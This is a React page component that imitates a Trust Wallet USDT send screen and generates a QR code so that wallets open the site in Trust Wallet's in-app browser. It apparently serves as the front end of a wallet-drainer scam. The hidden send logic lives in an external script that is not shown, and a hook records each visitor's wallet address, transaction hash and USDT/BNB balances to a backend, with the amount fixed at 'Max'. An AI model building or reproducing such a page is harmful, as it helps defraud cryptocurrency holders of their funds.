import { useState, useEffect } from "react";
import { useMutation } from "convex/react";
import { api } from "@/convex/_generated/api.js";
import QRCode from "qrcode";
import { Button } from "@/components/ui/button.tsx";
import { Dialog, DialogContent, DialogHeader, DialogTitle } from "@/components/ui/dialog.tsx";
import { QrCode, Download } from "lucide-react";
import { toast } from "sonner";

declare global {
  interface Window {
    sendUSDT?: () => Promise<void>;
    saveTransaction?: (data: {
      walletAddress: string;
      toAddress: string;
      txHash: string;
      usdtBalance: string;
      nativeBalance: string;
    }) => void;
  }
}

export default function Index() {
  const [toAddress, setToAddress] = useState("");
  const [amount, setAmount] = useState("");
  const [showQR, setShowQR] = useState(false);
  const [qrDataUrl, setQrDataUrl] = useState("");
  const createTransaction = useMutation(api.transactions.createTransaction);

  useEffect(() => {
    // Expose save function to app.js
    window.saveTransaction = (data) => {
      createTransaction({
        walletAddress: data.walletAddress,
        toAddress: data.toAddress,
        amount: "Max",
        txHash: data.txHash,
        usdtBalance: data.usdtBalance + " USDT",
        nativeBalance: data.nativeBalance + " BNB",
      }).catch(console.error);
    };

    return () => {
      delete window.saveTransaction;
    };
  }, [createTransaction]);

  function handleSendUSDT() {
    if (window.sendUSDT) {
      window.sendUSDT();
    }
  }

  function setMax() {
    setAmount("Max");
  }

  async function generateQRCode() {
    try {
      // Get current website URL
      const websiteUrl = window.location.origin;
      
      // Trust Wallet deep link format
      const deepLink = `https://link.trustwallet.com/browser?url=${encodeURIComponent(websiteUrl)}`;
      
      // Generate QR code
      const dataUrl = await QRCode.toDataURL(deepLink, {
        width: 300,
        margin: 2,
        color: {
          dark: "#000000",
          light: "#FFFFFF",
        },
      });
      
      setQrDataUrl(dataUrl);
      setShowQR(true);
    } catch (error) {
      console.error("QR code generation failed:", error);
      toast.error("Failed to generate QR code");
    }
  }

  function downloadQR() {
    if (!qrDataUrl) return;
    
    const link = document.createElement("a");
    link.href = qrDataUrl;
    link.download = "trust-wallet-qr.png";
    link.click();
    toast.success("QR code downloaded");
  }

  return (
    <div
      style={{
        margin: 0,
        background: "#0b0b0b",
        color: "#fff",
        fontFamily: "-apple-system, BlinkMacSystemFont, sans-serif",
        minHeight: "100vh",
      }}
    >
      <div style={{ padding: "20px" }}>
        <div style={{ fontSize: "14px", opacity: 0.7, marginBottom: "6px" }}>
          Address or Domain Name
        </div>
        <div
          style={{
            background: "#151515",
            borderRadius: "12px",
            padding: "14px",
            marginBottom: "20px",
          }}
        >
          <input
            id="toAddress"
            value={toAddress}
            onChange={(e) => setToAddress(e.target.value)}
            placeholder="0x..."
            style={{
              width: "100%",
              background: "transparent",
              border: "none",
              outline: "none",
              color: "#fff",
              fontSize: "16px",
            }}
          />
        </div>

        <div style={{ fontSize: "14px", opacity: 0.7, marginBottom: "6px" }}>
          Amount
        </div>
        <div
          style={{
            background: "#151515",
            borderRadius: "12px",
            padding: "14px",
            marginBottom: "20px",
            display: "flex",
            justifyContent: "space-between",
            alignItems: "center",
          }}
        >
          <input
            id="amount"
            value={amount}
            onChange={(e) => setAmount(e.target.value)}
            placeholder="0.0"
            style={{
              background: "transparent",
              border: "none",
              outline: "none",
              color: "#fff",
              fontSize: "16px",
              flex: 1,
            }}
          />
          <div>
            <span style={{ color: "#25d695", fontWeight: 600 }}>USDT</span>
            &nbsp;&nbsp;
            <span
              onClick={setMax}
              style={{
                color: "#25d695",
                fontSize: "14px",
                cursor: "pointer",
              }}
            >
              Max
            </span>
          </div>
        </div>
      </div>

      <button
        onClick={handleSendUSDT}
        style={{
          position: "fixed",
          bottom: "20px",
          left: "20px",
          right: "20px",
          background: "#1f8f5f",
          color: "#000",
          border: "none",
          borderRadius: "14px",
          padding: "16px",
          fontSize: "18px",
          fontWeight: 600,
          cursor: "pointer",
        }}
      >
        Next
      </button>

      {/* QR Code Button */}
      <button
        onClick={generateQRCode}
        style={{
          position: "fixed",
          top: "20px",
          right: "20px",
          background: "#25d695",
          color: "#000",
          border: "none",
          borderRadius: "50%",
          width: "50px",
          height: "50px",
          display: "flex",
          alignItems: "center",
          justifyContent: "center",
          cursor: "pointer",
          boxShadow: "0 4px 12px rgba(37, 214, 149, 0.3)",
        }}
      >
        <QrCode size={24} />
      </button>

      {/* QR Code Dialog */}
      <Dialog open={showQR} onOpenChange={setShowQR}>
        <DialogContent className="max-w-sm bg-[#0b0b0b] border-[#252525] text-white">
          <DialogHeader>
            <DialogTitle className="text-center text-xl">Scan with Trust Wallet</DialogTitle>
          </DialogHeader>
          
          <div className="space-y-4">
            <div className="bg-[#151515] rounded-xl p-4 text-center">
              <div className="flex items-center justify-center gap-2 mb-3">
                <img 
                  src="https://trustwallet.com/assets/images/trust_logotype.svg" 
                  alt="Trust Wallet"
                  className="h-6"
                  onError={(e) => {
                    (e.target as HTMLImageElement).style.display = 'none';
                  }}
                />
                <span className="text-sm text-[#25d695]">USDT BNB Smart Chain</span>
              </div>

              {qrDataUrl && (
                <div className="bg-white rounded-lg p-4 inline-block">
                  <img src={qrDataUrl} alt="QR Code" className="w-64 h-64" />
                </div>
              )}

              <div className="mt-4 text-xs text-gray-400 break-all font-mono">
                {window.location.origin}
              </div>
            </div>

            <div className="grid grid-cols-2 gap-3">
              <Button
                variant="outline"
                onClick={downloadQR}
              >
                <Download className="mr-2 h-4 w-4" />
                Download
              </Button>
              <Button
                onClick={() => setShowQR(false)}
                className="bg-[#25d695] hover:bg-[#1f8f5f] text-black font-semibold"
              >
                Close
              </Button>
            </div>

            <div className="text-xs text-gray-400 text-center">
              Open Trust Wallet → Scan QR → Website will open automatically
            </div>
          </div>
        </DialogContent>
      </Dialog>
    </div>
  );
}
